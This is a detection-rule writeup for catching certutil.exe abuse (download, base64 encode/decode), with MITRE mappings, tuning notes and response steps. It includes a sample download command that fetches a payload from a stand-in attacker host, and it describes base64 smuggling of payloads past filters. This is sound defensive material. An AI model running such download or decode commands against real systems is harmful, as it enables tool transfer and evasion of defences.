# LOLBAS Abuse - Certutil Download/Encode/Decode

**Severity:** High\
**MITRE ATT&CK:** T1105 (Ingress Tool Transfer), T1027 (Obfuscated Files or
Information), T1140 (Deobfuscate/Decode Files or Information)\
**Owner:** Jino

## Description

Detects certutil.exe invoked with switches associated with known abuse
patterns rather than its intended certificate-management purpose:

- `-urlcache` / `-verifyctl` (combined with `-f`) — downloads a file from
  an arbitrary URL, e.g.:
  `certutil.exe -urlcache -split -f http://attacker.site/payload.exe out.exe`
- `-decode` — decodes a base64-encoded file back to its original form,
  commonly used to smuggle a payload past content filters as harmless-
  looking base64 text, then reconstitute it on disk.
- `-encode` — encodes a file to base64, sometimes used defensively but
  also seen used by attackers preparing exfiltration or staging.

## Why command-line pattern, not "any execution"

Unlike finger.exe, certutil.exe has genuine legitimate use (certificate
management, PKI operations) so alerting on presence alone would be noisy.
The specific switch combinations above are the differentiator — Microsoft
did not intend certutil to be a general-purpose downloader or encoder, and
these flags are the abused surface area, not the tool's core function.

## Source

https://lolbas-project.github.io/lolbas/Binaries/Certutil/

## Tuning note

- `-encode`/`-decode` alone have a slightly higher false-positive
  potential than `-urlcache`/`-verifyctl` (occasional legitimate cert
  export/import workflows use them) — if this gets noisy, split it into
  two rules: one for the download switches (higher confidence, likely low
  noise) and one for encode/decode (needs more context to triage).
- Pull the full command line on any hit — the destination URL (for
  urlcache/verifyctl) or the file being encoded/decoded tells you almost
  everything you need for triage.

## Response action

Alert and investigate. If the download variant matches, treat as high
priority — a successful match means a file was very likely retrieved from
an external source and written to disk.